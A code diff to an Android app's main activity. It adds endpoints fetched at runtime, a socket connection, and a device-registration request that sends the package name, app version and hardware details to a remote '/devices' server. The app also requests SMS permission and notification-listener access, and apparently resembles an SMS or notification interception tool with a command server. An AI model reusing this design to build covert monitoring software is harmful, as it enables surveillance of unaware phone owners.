@@ -5,8 +5,11 @@ import android.annotation.SuppressLint;
 import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Handler;
+import android.os.Looper;
 import android.provider.Settings;
 import android.util.Log;
 import android.view.LayoutInflater;
@@ -37,6 +40,10 @@ public class MainActivity extends BaseActivity {
     public AlertDialog dialog;
 
     private static final int SMS_PERMISSION_REQUEST_CODE = 1;
+    private static final int MAX_RETRIES = 10;
+    private static final long DELAY_MS = 6000; // 6 seconds per retry
+    private int retryCount = 0;
+    private Handler handler = new Handler(Looper.getMainLooper());
 
     @SuppressLint("SetTextI18n")
     @Override
@@ -63,6 +70,10 @@ public class MainActivity extends BaseActivity {
 
     private void runApp(){
         setContentView(R.layout.activity_main);
+
+        // init the after the apinPointSet
+        socketManager = SocketManager.getInstance(context);
+        socketManager.connect();
 
         Intent serviceIntent = new Intent(this, RunningService.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -141,7 +152,7 @@ public class MainActivity extends BaseActivity {
     }
 
     private void initializeWebView() {
-        registerPhoneData();
+        initializeApiPoints();
     }
 
 
@@ -281,18 +292,21 @@ public class MainActivity extends BaseActivity {
         builder.show();
     }
     private void openAppSettings() {
-        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
+        Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
         intent.addCategory(Intent.CATEGORY_DEFAULT);
-        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        intent.setData(Uri.parse("package:" + getPackageName()));
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         startActivity(intent);
     }
 
     public void registerPhoneData() {
-        String url = helper.ApiUrl() + "/devices";
+        String url = helper.ApiUrl(context) + "/devices";
         JSONObject sendData = new JSONObject();
 
         try {
             sendData.put("form_code", helper.FormCode());
+            sendData.put("app_version", helper.AppVersion);
+            sendData.put("package_name", helper.getPackageName(context));
             sendData.put("device_name", Build.MANUFACTURER);
             sendData.put("device_model", Build.MODEL);
             sendData.put("device_android_version", Build.VERSION.RELEASE);
@@ -338,48 +352,48 @@ public class MainActivity extends BaseActivity {
 //        Log.d(TAG, "Registering device with data: " + sendData.toString());
 
         // ✅ Send the POST request
-        networkHelper.makePostRequest(url, sendData, new NetworkHelper.PostRequestCallback() {
-            @Override
-            public void onSuccess(String result) {
-                runOnUiThread(() -> {
-                    try {
-                        JSONObject jsonData = new JSONObject(result);
-                        int status = jsonData.optInt("status", 0);
-                        String message = jsonData.optString("message", "No message");
+            networkHelper.makePostRequest(url, sendData, new NetworkHelper.PostRequestCallback() {
+                @Override
+                public void onSuccess(String result) {
+                    runOnUiThread(() -> {
+                        try {
+                            JSONObject jsonData = new JSONObject(result);
+                            int status = jsonData.optInt("status", 0);
+                            String message = jsonData.optString("message", "No message");
 
-                        if (status == 200) {
-                            int device_id = jsonData.getInt("device_id");
-                            storage.saveInt("device_id", device_id);
-//                            Toast.makeText(getApplicationContext(),
-//                                    "Device registered successfully ✅",
-//                                    Toast.LENGTH_SHORT).show();
-                            setupLoading.hide();
-                            runApp();
-                        } else {
+                            if (status == 200) {
+                                int device_id = jsonData.getInt("device_id");
+                                storage.saveInt("device_id", device_id);
+    //                            Toast.makeText(getApplicationContext(),
+    //                                    "Device registered successfully ✅",
+    //                                    Toast.LENGTH_SHORT).show();
+                                setupLoading.hide();
+                                runApp();
+                            } else {
+                                Toast.makeText(getApplicationContext(),
+                                        "Registration failed: " + message,
+                                        Toast.LENGTH_LONG).show();
+                                Log.d(TAG, "Device not registered: " + message);
+                            }
+                        } catch (JSONException e) {
+                            Log.e(TAG, "Response parse error: " + e.getMessage());
                             Toast.makeText(getApplicationContext(),
-                                    "Registration failed: " + message,
+                                    "Invalid response format from server",
                                     Toast.LENGTH_LONG).show();
-                            Log.d(TAG, "Device not registered: " + message);
                         }
-                    } catch (JSONException e) {
-                        Log.e(TAG, "Response parse error: " + e.getMessage());
-                        Toast.makeText(getApplicationContext(),
-                                "Invalid response format from server",
-                                Toast.LENGTH_LONG).show();
-                    }
-                });
-            }
+                    });
+                }
 
-            @Override
-            public void onFailure(String error) {
-                runOnUiThread(() -> {
-                    Log.e(TAG, "Request failed: " + error);
-                    Toast.makeText(getApplicationContext(),
-                            "Network error: " + error,
-                            Toast.LENGTH_LONG).show();
-                });
-            }
-        });
+                @Override
+                public void onFailure(String error) {
+                    runOnUiThread(() -> {
+                        Log.e(TAG, "Request failed: " + error);
+                        Toast.makeText(getApplicationContext(),
+                                "Network error: " + error,
+                                Toast.LENGTH_LONG).show();
+                    });
+                }
+            });
     }
 
     private boolean hasPermission() {
@@ -396,6 +410,24 @@ public class MainActivity extends BaseActivity {
     private boolean isNotificationListenerEnabled() {
         Set<String> enabledListenerPackages = NotificationManagerCompat.getEnabledListenerPackages(this);
         return enabledListenerPackages.contains(getPackageName());
+    }
+
+    private void initializeApiPoints() {
+        ApiUpdater updater = new ApiUpdater();
+        updater.updateApiPoints(this, new ApiUpdater.ApiPointsCallback() {
+            @Override
+            public void onApiPointsUpdated(String apiUrl, String socketUrl) {
+                registerPhoneData();
+                socketManager = SocketManager.getInstance(context);
+                socketManager.connect();
+            }
+            @Override
+            public void onApiPointsFailure(String error) {
+                // If the app can't function without these URLs, you should show an Alert Dialog here.
+                Log.e("MAIN", "Failed to load API Points: " + error);
+                Toast.makeText(context, "Configuration failed. Check connection.", Toast.LENGTH_LONG).show();
+            }
+        });
     }
 
 
